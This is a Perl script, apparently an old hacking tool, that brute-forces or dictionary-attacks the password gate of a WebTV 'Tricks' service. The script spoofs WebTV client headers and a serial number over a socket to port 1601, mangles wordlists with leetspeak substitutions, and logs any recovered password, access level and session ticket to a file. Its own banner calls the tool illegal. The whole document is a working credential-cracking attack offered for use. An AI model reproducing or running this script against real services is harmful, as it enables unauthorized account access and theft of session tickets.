use IO::Socket;



print "This tool cracks the WebTV Tricks passwords authorization block, which means its ileagal.  Please  use with the known risk of breaking the law or don't use it all in interest of federal law.";

&Init;

sub Init {
print "\n\n\n";
print "Please type the IP of the service: ";
chop($Host=<STDIN>);
print "Silicon Seral ID (blank if not known)? ";
chop($ssid=<STDIN>);

print "Fast Scan (y/n)? ";
chop($NoBlock=<STDIN>);


if(!($ssid)){
$ssid="81DDDD0400b002DD";
}
print "\nOptions\n Brute Force=1\n Password list=2\n";
print "\nPick you option: ";
chop($optonal=<STDIN>);
&execute;
}

sub execute {



if($optonal == 1){

print "\nBrute Force Options\n 1=Alphanumeric\n 2=Alphabetical only\n 3=Numeral only\n 4=User defined\n\n";
print "Chose your base string: ";
chop($BS=<STDIN>);

if($BS == 3){
#Numerical
$base="0123456789";
}elsif($BS == 1){
#Alphanumeric
$base="0123456789abcdefghijklmnnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
}elsif($BS == 2){
#Alpabetical
$base="abcdefghijklmnnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
}else{
print "\nPlease enter your base string:\n";
chop($base=<STDIN>);
}

print "\nEnglish word check (y/n)? ";
chop($EWC=<STDIN>);

print "Start the scan out with a word of how many chars (default 4)? ";
chop($CXZDV=<STDIN>);
if(!($CXZDV)){
$CXZDV=4;
}
$baselen=length($base);
$vstart=int(power($baselen,($CXZDV-1)));
$vstart--;




while($vstart < 100000000000) {
$vstart++;


splice(@memorylast);
$sucka=0;
$passtest=fromDecToNumSys($vstart,$baselen);
if((($EWC eq "y") && index(lc($passtest),"a") > (-1) || index(lc($passtest),"e") > (-1) || index(lc($passtest),"i") > (-1) || index(lc($passtest),"o") > (-1) || index(lc($passtest),"u") > (-1) || index(lc($passtest),"y") > (-1)) || ($EWC eq "n")){

($a,$b)=tryPassword($passtest,$Host);

if($a || $b){
open(FILE,">> Yahoo.txt");
print FILE "Eureka!! We found the key!! Lets do the tricks found key dance!\n";
print FILE "Password: $passtesty\n";
print FILE "Access level: $a\n";
print FILE "Ticket: $b\n\n";
close(FILE);

print "Eureka!! We found the key!! Lets do the tricks found key dance!\n";
print "Password: $passtest\n";
print "Access level: $a\n";
print "Ticket: $b\n\n";


}else{
print "Bad Password ($passtest)\n";
}

}
}

}else{

print "Use password matiplation (Will greater the passwoed list)? (y/n): ";
chop($PWDM=<STDIN>);


open(FILE,"PassDict.txt");
@Passwds=<FILE>;
close(FILE);
splice(@temp);
if($PWDM eq "y"){
print "Write to Password file with matiplation results? (y/n): ";
chop($CMR=<STDIN>);

foreach  (@Passwds) {
push(@temp,"$_");
$VXZ=$_;
$_=~s/[a][A]/4/g;
$_=~s/[o][O]/0/g;
$_=~s/[L][l]/1/g;
$_=~s/ter/tah/g;
$_=~s/ate/8/g;
$_=~s/f/ph/g;
$_=~s/one/1/g;
$_=~s/two/2/g;
$_=~s/three/3/g;
$_=~s/four/4/g;
$_=~s/five/5/g;
$_=~s/six/6/g;
$_=~s/seven/7/g;
$_=~s/eight/8/g;
$_=~s/nine/9/g;
if($_ ne $VXZ){
push(@temp,"$_");
}

$VXZX=$VXZ;
$VXZ=~s/1/l/g;
$VXZ=~s/4/a/g;
$VXZ=~s/0/o/g;
$VXZ=~s/tah/ter/g;
$VXZ=~s/8/ate/g;
$VXZ=~s/ph/f/g;
$VXZ=~s/1/one/g;
$VXZ=~s/2/two/g;
$VXZ=~s/3/three/g;
$VXZ=~s/5/five/g;
$VXZ=~s/6/six/g;
$VXZ=~s/7/seven/g;
$VXZ=~s/8/eight/g;
$VXZ=~s/9/nine/g;
$VXZ=~s/10/ten/g;
if($VXZX ne $VXZ){
push(@temp,"$VXZ");
}


}
splice(@Passwds);
push(@Passwds,@temp);


if($CMR eq "y"){
open(FILE,"> PassDict.txt");
foreach  (@Passwds) {
print FILE $_;
}
close(FILE);
}


}



foreach $passwordtry (@Passwds) {
chop($passwordtry) if ($passwordtry=~/\r/);
chop($passwordtry) if ($passwordtry=~/\n/);

($a,$b)=tryPassword($passwordtry,"$Host");

if($a || $b){
open(FILE,">> Yahoo.txt");
print FILE "Eureka!! We found the key!! Lets do the tricks found key dance!\n";
print FILE "Password: $passwordtry\n";
print FILE "Access level: $a\n";
print FILE "Ticket: $b\n\n";
close(FILE);

print "Eureka!! We found the key!! Lets do the tricks found key dance!\n";
print "Password: $passwordtry\n";
print "Access level: $a\n";
print "Ticket: $b\n\n";


}else{
print "Bad Password ($passwordtry)\n";
}
}



}
&Init;
}

sub tryPassword {
$aa=$_[0];
$bb=$_[1];
#Used to have faster scan.

if(!($bb eq $LastSock) || !(<$sock>) || !($NoBlock eq "y")){
print "\nReconnecting\n";
$sock=IO::Socket::INET->new("$bb:1601");
$LastSock=$bb;
}
if($sock){
$COOL="password=$aa&nextUrl=wtv-tricks:/tricks";
print $sock "POST wtv-head-waiter:/tricks-passwd\r\n";
print $sock "wtv-incarnation: 2\r\n";
print $sock "Accept-Language: jp\r\n";
print $sock "wtv-connect-session-id: 12bab3a4\r\n";
print $sock "wtv-client-serial-number: $ssid\r\n";
print $sock "wtv-encryption: true\r\n";
print $sock "wtv-capability-flags: 1c93bef\r\n";
print $sock "wtv-system-version: 1219\r\n";
print $sock "wtv-client-rom-type: bf0app\r\n";
print $sock "wtv-client-bootrom-version: 105\r\n";
print $sock "wtv-system-chipversion: 16842752\r\n";
print $sock "wtv-system-sysconfig: 736935823\r\n";
print $sock "wtv-system-cpuspeed: 11279088\r\n";
print $sock "wtv-script-id: 0\r\n";
print $sock "wtv-script-mod: 0\r\n";
print $sock "Content-length: ".length($COOL)."\r\n";
print $sock "Content-type: x-www-form-encoded\r\n\r\n";
print $sock $COOL;

while($buff=<$sock>){
chop($buff);

$cmd=substr($buff,0,index($buff," "));
$prms=substr($buff,index($buff," ")+1);
if($cmd == 500 || $cmd == 400){

return 0;
}elsif($cmd eq "wtv-tricks-access-level:"){
$accessLevel=$prms;
}elsif($cmd eq "wtv-ticket:"){
$accessTicket=$prms;
}


}

}else{
print "Unable to connect\n";
return 0;
$LastSock="";
}

return ($accessLevel,$accessTicket);
}


sub charAt {
$string=$_[0];
$pos=$_[1];
return substr($string,$pos,1);
}

sub power {
$base_X=$_[0];
$exponent=$_[1];
$shootme=1;

while ($exponent){
$exponent--;


$shootme=$shootme*$base_X;

}
return $shootme;
}


sub wholeNum {
$num=$_[0];
return (index($num,".") > (-1)) ? int(substr($num,0,index($num,"."))) : $num;
}

sub fromDecToNumSys {
$avc=$_[0];
$bvc=$_[1];

$vintage=0;
$returnvalue="";
$first=wholeNum($avc/$bvc);
$last=($avc)%($bvc);

if($first > ($bvc-1)){


push(@memorylast,$last);
$sucka=1;
fromDecToNumSys($first,$bvc);
}else{
@memorylast=reverse(@memorylast);





for($i=0; $i < ($#memorylast)+1; $i++){

$returnvalue.=charAt($base,$memorylast[$i]);

}
if($sucka){
$first--;
}
return charAt($base,$first).charAt($base,$last).$returnvalue;
}
}